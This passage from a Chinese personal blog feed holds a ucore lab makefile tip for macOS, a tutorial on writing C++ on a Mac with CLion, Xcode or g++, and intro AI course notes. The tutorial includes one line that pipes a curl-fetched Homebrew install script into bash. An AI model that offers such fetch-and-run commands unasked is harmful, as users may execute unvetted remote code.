data-target="#collapse-n77vzslmrh9u65"></i><span>makefile</span><div class="collapse show" id="collapse-n77vzslmrh9u65"><pre><code class="hljs makefile">WORKING_DIR=<span class="hljs-variable">$(<span class="hljs-built_in">shell</span> pwd)</span><span class="hljs-section">debug: <span class="hljs-variable">$(UCOREIMG)</span></span><span class="hljs-variable">$(V)</span><span class="hljs-variable">$(QEMU)</span> -S -s -parallel stdio -hda <span class="hljs-variable">$&lt;</span> -serial null &amp;<span class="hljs-variable">$(V)</span>sleep 2<span class="hljs-variable">$(V)</span> osascript -e 'tell application <span class="hljs-string">"Terminal"</span> to do script <span class="hljs-string">"cd <span class="hljs-variable">$(WORKING_DIR)</span>; gdb -q -x tools/gdbinit"</span>'</code></pre></div></div><p>其中最后一句是为了产生一个在当前工作目录的新终端。</p><h3 id="总结">总结</h3><p>前前后后也花了相当长的时间来应对环境的不同。后续的内容其实更吸引着我们去深入探索。</p><h3 id="后续">后续</h3><p>已知问题: lab1的<code>chellenge</code>无法正常切换<code>user_mode</code>，初步排查发现是出现了操作数异常，可能是<code>%esp</code>未正确赋值，但目前还没有找到方案。如果对此部分有较深研究，也欢迎交流。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/Ucore%20Lab0%20on%20Apple%20Silicon%20Mac/20230828210516439336_347_20221130222055575294_180_image-20221130221829874.png" alt="image-20221130221829874"><figcaption aria-hidden="true">image-20221130221829874</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/Ucore%20Lab0%20on%20Apple%20Silicon%20Mac/20230828210517766871_274_20221130222057952350_733_image-20221130221851517.png" alt="image-20221130221851517"><figcaption aria-hidden="true">image-20221130221851517</figcaption></figure><p>chellenge以外的部分以及后两个实验均可正确得到结果。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/Ucore%20Lab0%20on%20Apple%20Silicon%20Mac/20230828210519668627_236_20221130222100838376_161_image-20221130222030887.png" alt="image-20221130222030887"><figcaption aria-hidden="true">image-20221130222030887</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>小寄巧</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>如何在mac上编写运行c++程序</title>
    <link href="/posts/51388/"/>
    <url>/posts/51388/</url>
    
    <content type="html"><![CDATA[<h2 id="如何在mac上编写运行c程序">如何在mac上编写运行c++程序</h2><p>有一部分同学买的电脑是mac，也有很多同学问怎么在mac上写c++代码。在这里解答一下。</p><h3 id="方案一使用clion">方案一：使用Clion</h3><h4 id="下载">下载</h4><p><a href="https://www.jetbrains.com/clion/download/#section=mac">下载网址</a></p><p>如果你的苹果电脑是M1/M2芯片，那么请选择Apple Sillcon，否则选Intel</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211348592840_486_20220929230752211301_738_image-20220927201026604.png" alt="image-20220927201026604"><figcaption aria-hidden="true">image-20220927201026604</figcaption></figure><p>然后打开dmg文件将其拖到applcation文件夹即可。</p><h4 id="激活">激活</h4><p>Clion并不是一个免费的软件。但是作为学生，可以向其申请免费使用。点击<a href="https://www.jetbrains.com/zh-cn/community/education/#students">这里</a>进入申请页面。正常情况下用你的学生邮箱就可以申请。申请之后会自动跳转到Clion，激活成功。</p><h4 id="创建第一个项目">创建第一个项目</h4><p>点击“新建项目”，选择默认的c++ excutable</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211349779426_650_20220929230754550529_520_image-20220927203943145.png" alt="image-20220927203943145"><figcaption aria-hidden="true">image-20220927203943145</figcaption></figure><p>在location处可以改变项目路径和名称。</p><p>如果之前你没写过代码，可能会提示</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211350791432_948_20220929230756221193_195_image-20220927204027175.png" alt="image-20220927204027175"><figcaption aria-hidden="true">image-20220927204027175</figcaption></figure><p>安装即可。可能需要等待亿些时间。（类似于visualstudio的工具链，可能会捆绑一些你可能其实用不到的东西）</p><p>然后安装完确认一下</p><p align="center"><img alt="image-20220927211547461" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211351901314_661_20220929230757928357_218_image-20220927211547461.png" width="50%"></p><p>项目配置没有报错</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211353707000_855_20220929230759316655_492_image-20220927211608280.png" alt="image-20220927211608280"><figcaption aria-hidden="true">image-20220927211608280</figcaption></figure><p>然后选中CMakeLists，点击2处的刷新符号，重新构建</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211354844990_772_20220929230801131735_750_image-20220927211726878.png" alt="image-20220927211726878"><figcaption aria-hidden="true">image-20220927211726878</figcaption></figure><p>你应当发现此处的项目配置发生了改变。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211356099715_652_20220929230802745480_349_image-20220927211737021.png" alt="image-20220927211737021"><figcaption aria-hidden="true">image-20220927211737021</figcaption></figure><p>此时点击运行，运行helloworld程序，成功</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211357120705_322_20220929230804052581_398_image-20220927211838631.png" alt="image-20220927211838631"><figcaption aria-hidden="true">image-20220927211838631</figcaption></figure><h4 id="简单了解cmake">简单了解Cmake</h4><p>如果你想要在这个项目下运行多个cpp文件，你有必要了解一下cmake。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211358771376_527_20220929230805695741_398_image-20220927212015622.png" alt="image-20220927212015622"><figcaption aria-hidden="true">image-20220927212015622</figcaption></figure><p>你会发现cmakelist变成了这样。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211400319222_292_20220929230808172534_771_image-20220927212042215.png" alt="image-20220927212042215"><figcaption aria-hidden="true">image-20220927212042215</figcaption></figure><p>然后你顺理成章的点击了main函数旁边的运行</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211401588397_383_20220929230809367068_211_image-20220927212255496.png" alt="image-20220927212255496"><figcaption aria-hidden="true">image-20220927212255496</figcaption></figure><p>报错了！查看倒数第三行的报错信息，你会发现出现了重复（duplicate）的符号。</p><p>你想到课上使用vs时讲的，一个项目只能使用一个main函数。你把另外一个main改成了main2。学着这样修改。你发现确实可以正常运行。</p><p><font color="Apricot">但有没有更优雅的解决方案呢？</font></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211403630984_240_20220929230811319016_339_image-20220927212700579.png" alt="image-20220927212700579"><figcaption aria-hidden="true">image-20220927212700579</figcaption></figure><p>你注意到了cmake中最后一行是add_executable，刚刚发生了变化。从含义可以推测出一定是它控制了程序的执行。</p><p>让它们各自生成各自的程序一定可以！</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211404584803_168_20220929230812325537_398_image-20220927212920160.png" alt="image-20220927212920160"><figcaption aria-hidden="true">image-20220927212920160</figcaption></figure><p>点击Reload changes。你会发现项目构建出现了两个程序。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211405764265_135_20220929230813838131_522_image-20220927213032997.png" alt="image-20220927213032997"><figcaption aria-hidden="true">image-20220927213032997</figcaption></figure><p>然后你高兴的发现点击哪个程序运行，你就可以运行哪一个cpp文件！</p><p>事实上，你点击cmake_build_debug，你会发现add_excutable第一个参数正是生成程序的名称！</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211407249755_411_20220929230815024257_502_image-20220927213245467.png" alt="image-20220927213245467"><figcaption aria-hidden="true">image-20220927213245467</figcaption></figure><p>在访达打开<img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211408513055_721_20220929230816481939_447_image-20220927213323515.png" alt="image-20220927213323515"></p><p>双击---helloworld出现了！它正是你刚刚编写的程序！</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211409899559_387_20220929230818933782_519_image-20220927213343594.png" alt="image-20220927213343594"><figcaption aria-hidden="true">image-20220927213343594</figcaption></figure><p>Cmake在大型项目管理中有着重要的用途，其本身也是十分复杂的。但在课程中只需要了解这些即可。</p><p>同时Clion在windows下也可以使用。</p><h3 id="方案二使用xcode">方案二：使用xcode</h3><p>xcode是专为mac平台打造的全功能IDE（当然你要问我能不能写exe，只能说emmm）</p><p>xcode比较大，下载需要耐心等待。</p><h4 id="项目搭建">项目搭建</h4><p>点击新建项目</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211411524873_100_20220929230821620085_933_image-20220927213913046.png" alt="image-20220927213913046"><figcaption aria-hidden="true">image-20220927213913046</figcaption></figure><p>选择macOS控制台应用</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211413302664_259_20220929230823254664_156_image-20220927213932265.png" alt="image-20220927213932265"><figcaption aria-hidden="true">image-20220927213932265</figcaption></figure><p>项目选项</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211414769754_153_20220929230824771816_210_image-20220927214102217.png" alt="image-20220927214102217"><figcaption aria-hidden="true">image-20220927214102217</figcaption></figure><p>注意组织名称写com，别的其实也行，但此处不作介绍。</p><p>语言选择c++。</p><p>选择项目位置后就可以愉快开发了！</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211416321696_447_20220929230826057443_745_image-20220927214344955.png" alt="image-20220927214344955"><figcaption aria-hidden="true">image-20220927214344955</figcaption></figure><p>控制台在屏幕下方。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211417576173_303_20220929230827635084_833_image-20220927214423776.png" alt="image-20220927214423776"><figcaption aria-hidden="true">image-20220927214423776</figcaption></figure><h4 id="运行多个cpp">运行多个cpp</h4><p>这个时候已经创建了一个cpp-project的项目，里面包含了一个main.cpp文件如果这个时候想要在同一个工程里面创建第二个带main函数的c++文件并运行，就需要通过创建Target来实现</p><p>Project是一个工程项目，一个Project可以包含多个TargetTarget之间互相没有关系，Target于Project的关系是：Target的Setting一部分继承自Project的Setting</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211418623132_866_20220929230828821606_386_image-20220927214845054.png" alt="image-20220927214845054"><figcaption aria-hidden="true">image-20220927214845054</figcaption></figure><p>新建target，同样选择commandline tool，填写一个的名称</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211420060785_695_20220929230831064192_247_image-20220927215021382.png" alt="image-20220927215021382"><figcaption aria-hidden="true">image-20220927215021382</figcaption></figure><p>在上方，想运行哪一个target，选择对应的即可。</p><p align="center"><img alt="image-20220927215233319" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211421185173_773_20220929230832540286_682_image-20220927215233319.png" width="50%"></p><h3 id="方案三命令行方式">方案三：命令行方式</h3><p>安装homebrew（如果已经下载过xcode可以跳过，不过既然如此为什么不用xcode呢？）</p><p>在你的终端输入这行指令：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-1s5iaklmrh9u68"></i><span>awk</span><div class="collapse show" id="collapse-1s5iaklmrh9u68"><pre><code class="hljs awk"><span class="hljs-regexp">/bin/</span>bash -c <span class="hljs-string">"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"</span></code></pre></div></div><p>如果下载很慢一般是网络问题，请自行解决。</p><p>安装完成后</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-gf1ts3lmrh9u68"></i><span>mipsasm</span><div class="collapse show" id="collapse-gf1ts3lmrh9u68"><pre><code class="hljs mipsasm"><span class="hljs-keyword">brew </span><span class="hljs-keyword">install </span>g++</code></pre></div></div><p>任意位置新建cpp文件。</p><p>cpp文件可以用你喜欢的方式打开编辑。</p><p>按⌘（command）+ ⌥（option）+c复制当前文件夹路径</p><p>终端输入</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-96kk1slmrh9u68"></i><span>bash</span><div class="collapse show" id="collapse-96kk1slmrh9u68"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> 刚才的路径</code></pre></div></div><p>然后</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-gc8nwdlmrh9u68"></i><span>aspectj</span><div class="collapse show" id="collapse-gc8nwdlmrh9u68"><pre><code class="hljs aspectj">g++ yourprogram.cpp -o <span class="hljs-keyword">target</span></code></pre></div></div><p>target 是生成的可执行文件的名字。</p><p>然后会发现生成了可执行文件，点击即可运行。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211422353231_803_20220929230833974800_101_image-20220927220347236.png" alt="image-20220927220347236"><figcaption aria-hidden="true">image-20220927220347236</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>小寄巧</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C++</tag>
      
      <tag>环境配置</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>人工智能导论</title>
    <link href="/posts/46759/"/>
    <url>/posts/46759/</url>
    
    <content type="html"><![CDATA[<p>人工智能导论</p><p>逻辑推理</p><p align="center"><img alt="image-20220831205211237" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210025711643_258_20220916221103884501_923_image-20220831205211237.png" width="50%"></p><p align="center"><img alt="image-20220831205344502" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210026938592_641_20220916221111633086_904_image-20220831205344502.png" width="50%"></p><p align="center"><img alt="image-20220831205448441" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210028062306_917_20220916221120315099_386_image-20220831205448441.png" width="50%"></p><p>任意对析取，存在对合取都是蕴含关系，分开的条件强于合起来的（举个例子就明白了）</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210029114569_463_20220916221127063207_401_image-20220831210345470.png" alt="image-20220831210345470"><figcaption aria-hidden="true">image-20220831210345470</figcaption></figure><p align="center"><img alt="image-20220831210404798" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210030208844_354_20220916221128281126_946_image-20220831210404798.png" width="50%"></p><p>只与新加入的直接相关</p><p align="center"><img alt="image-20220831211022710" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210031412961_436_20220916221129758335_145_image-20220831211022710.png" width="50%"></p><p align="center"><img alt="image-20220831211029655" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210033180741_738_20220916221130984768_647_image-20220831211029655.png" width="50%"></p><p align="center"><img alt="image-20220831211350521" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210034293828_443_20220916221132416550_481_image-20220831211350521.png" width="50%"></p><p>因果分析三层次：关联，介入，反事实</p><p>因果图三种形式：链，分连，汇连（chain，fork，collider)</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210035573692_180_20220916221134366409_448_image-20220831212134887.png" alt="image-20220831212134887"><figcaption aria-hidden="true">image-20220831212134887</figcaption></figure><p>做法：联合概率分布由每个节点与其父节点之间的条件概率得出。根节点是外生变量，其他的是内生</p><hr><p align="center"><img alt="image-20220831212713182" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210036929707_670_20220916221135899101_136_image-20220831212713182.png" width="50%"></p><p>深搜可能会陷入无限循环</p><p align="center"><img alt="image-20220831213452142" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210038002300_969_20220916221137133557_194_image-20220831213452142.png" width="50%"></p><p align="center"><img alt="image-20220831213527818" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210039846813_917_20220916221139012135_477_image-20220831213527818.png" width="50%"></p><p align="center"><img alt="image-20220831213624058" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210041129476_223_20220916221140593318_530_image-20220831213624058.png" width="50%"></p><p>有环路的图会使贪婪最佳优先算法不完备。</p><p>判断：启发函数满足可容性则一定能保证算法最优性x</p><p>树搜索是这样法，图不一定</p><p>判断：启发函数恒为0一定满足可容性x</p><p>启发函数不一定要是正数。</p><p>满足一致性可保证A*搜索算法最优</p><p>启发函数不会过高估计从当前节点到目标结点之间的实际代价。x</p><p>满足可容性的启发函数才有这样的性质。</p><p>MinMax的适用条件：两人博弈，信息透明，零和博弈</p><p align="center"><img alt="image-20220831215141822" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210042520064_342_20220916221142369023_436_image-20220831215141822.png" width="50%"></p><p>注意，没有规定必须要公平。D违反了零和博弈</p><p align="center"><img alt="image-20220831220640110" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210044088962_452_20220916221144124086_686_image-20220831220640110.png" width="50%"></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210047629658_923_20220916221145565187_669_image-20220831220659274.png" alt="image-20220831220659274"><figcaption aria-hidden="true">image-20220831220659274</figcaption></figure><p>这个做法是不对的，根据课本上的过程，A*算法会考虑所有可达的评价函数，每次从边缘集合拓展的节点并非总是当前节点的后继节点。fn评价函数是唯一标准如果发现有更小的，会倒回去。</p><p align="center"><img alt="image-20220831220818630" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210048841987_713_20220916221146871853_388_image-20220831220818630.png" width="50%"></p><p>而且贪婪最佳优先搜索也是启发式算法，优先选择启发函数最小的后继节点拓展。</p><p align="center"><img alt="image-20220831222502968" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210052161521_136_20220916221148285550_794_image-20220831222502968.png" width="50%"></p><p align="center"><img alt="image-20220831222848019" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210053407331_533_20220916221149618933_986_image-20220831222848019.png" width="50%"></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210055914678_403_20220916221152879301_392_image-20220831223950629.png" alt="image-20220831223950629"><figcaption aria-hidden="true">image-20220831223950629</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210100629197_676_20220916221155537145_635_image-20220831223959591.png" alt="image-20220831223959591"><figcaption aria-hidden="true">image-20220831223959591</figcaption></figure><p>记住蒙特卡洛树UCB的公式，明白反向传播的过程。 <span class="math display">\[U C B=\bar{X}_j+C \times \sqrt{\frac{2 \ln n}{n_j}}\]</span> <strong>上限置信区间</strong> <strong>(Upper Confidence Bound,UCB)</strong></p><hr><p>监督学习中经验风险和期望风险的概念</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210104619307_128_20220916221157700882_480_image-20220831224734326.png" alt="image-20220831224734326"><figcaption aria-hidden="true">image-20220831224734326</figcaption></figure><p align="center"><img alt="image-20220831224903093" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210105955603_361_20220916221159350035_550_image-20220831224903093.png" width="50%"></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210107235144_810_20220916221201393460_662_image-20220831224941130.png" alt="image-20220831224941130"><figcaption aria-hidden="true">image-20220831224941130</figcaption></figure><p align="center"><img alt="image-20220831224941224" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210107235144_810_20220916221201393460_662_image-20220831224941130.png" width="50%"></p><p>​常用的正则项方法包括L1正则项和L2正则项：其中L1使权重稀疏，L2使权重平滑。一句话总结就是：L1会趋向于产生少量的特征，而其他的特征都是0，而L2会选择更多的特征，这些特征都会接近于0。</p><p>怎么记：1比2小，生成的特征少</p><p align="center"><img alt="image-20220831225522763" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210111062631_540_20220916221204366868_381_image-20220831225522763.png" width="50%"></p><p align="center"><img alt="image-20220831225535198" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210112552099_228_20220916221206081717_192_image-20220831225535198.png" width="50%"></p><p>考法：判断哪些算法是判别模型，哪些是生成模型。大部分典型机器学习算法都是判别模型。贝叶斯方法，隐马科代夫链式生成模型</p><p align="center"><img alt="image-20220831230142515" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210115820984_167_20220916221207951204_832_image-20220831230142515.png" width="50%"></p><p>信息熵小，信息稳定，单一，纯度高；信息熵大，信息不稳定，纯度低。</p><p align="center"><img alt="image-20220831230645025" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210117454363_880_20220916221209692239_698_image-20220831230645025.png" width="50%"></p><p>决策树是在干什么呢？选择最佳属性对样本进行划分，得到最大的“纯度”</p><p>同时注意决策树是有监督学习。</p><p><strong>线性区别分析</strong> <strong>(</strong>linear discriminantanalysis, 